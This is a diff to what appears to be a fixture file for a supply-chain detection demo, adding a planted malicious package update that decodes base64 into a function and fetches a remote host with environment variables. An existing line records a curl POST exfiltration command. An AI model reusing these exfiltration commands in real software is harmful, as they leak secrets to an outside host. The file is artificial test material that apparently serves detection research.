@@ -13,6 +13,10 @@
  *              disabled install scripts by default.
  *   PLANTED-2  silent breakage: no new behaviour at all, but the computation changed. The kind of
  *              thing a green test suite sails past.
+ *   PLANTED-4  a decoder rather than a payload: a base64 blob becomes a function, and only then
+ *              touches the network. The half that matters never becomes a syscall, so this one is
+ *              caught by `nodert` and missed by eBPF — detection depends on which strategy watched.
+ *
  *   PLANTED-3  a legitimate new endpoint, documented in the package's own changelog. The hard
  *              negative: a tool that flags this is a tool people will turn off.
  */
@@ -35,6 +39,7 @@ const CHANGED = [
   { pkg: 'mime-types', from: '2.1.35', to: '2.1.36' },
   { pkg: 'deep-equal', from: '2.2.3', to: '2.2.4' },
   { pkg: 'yocto-queue', from: '1.0.0', to: '1.1.0' },
+  { pkg: 'flat-config', from: '3.2.0', to: '3.2.1', planted: 'PLANTED-4' },
 ];
 
 /**
@@ -50,6 +55,22 @@ const BEHAVIOUR = {
     net: [{ host: 'cdn-assets-delivery.workers.dev', port: 443, proto: 'tcp' }],
     proc: [{ argv: ['/bin/sh', '-c', 'curl -s -X POST -d @- https://cdn-assets-delivery.workers.dev/c'] }],
     importMs: 340,
+  },
+
+  // ── PLANTED-4: the payload is not in the source ───────────────────────────
+  // A decoder, not a payload. It reaches the network in the end, but the interesting half — a
+  // string becoming a function — never becomes a syscall, so eBPF sees a socket open and nothing
+  // that explains it. `nodert` sees the construction. This is the one plant whose detection
+  // depends on WHICH strategy watched, which is why every transcript carries its strategy.
+  'flat-config@3.2.0': {},
+  'flat-config@3.2.1': {
+    exec: [
+      { how: 'base64-decode', sample: '2048 chars' },
+      { how: 'Function', sample: 'return (async()=>{const r=await fetch(atob(h)+"/r?k="+process.env' },
+    ],
+    dns: ['telemetry-edge.pages.dev'],
+    net: [{ host: 'telemetry-edge.pages.dev', port: 443, proto: 'tcp' }],
+    importMs: 96,
   },
 
   // ── PLANTED-3: a documented new endpoint. Must NOT be treated as an attack ──
@@ -90,6 +111,16 @@ const INVARIANT_FAILURES = {
 
 /** What the open web says about each finding — the Tavily step, recorded for the demo. */
 const PUBLIC_RECORD = {
+  'flat-config@3.2.1': {
+    changelog: null,
+    advisory: null,
+    mentions: 1,
+    // The distinguishing detail. Somebody noticed the bundle grew and asked about it; nobody
+    // answered. That is not proof of anything, and it is exactly the kind of thing a human should
+    // see next to a finding rather than a week later.
+    verdict: 'One mention: an unanswered issue asking why the bundle grew 40 KB in a patch release.',
+    sources: ['https://github.com/example/flat-config/issues/211'],
+  },
   'express-fileupload@2.1.1': {
     changelog: null,
     advisory: null,
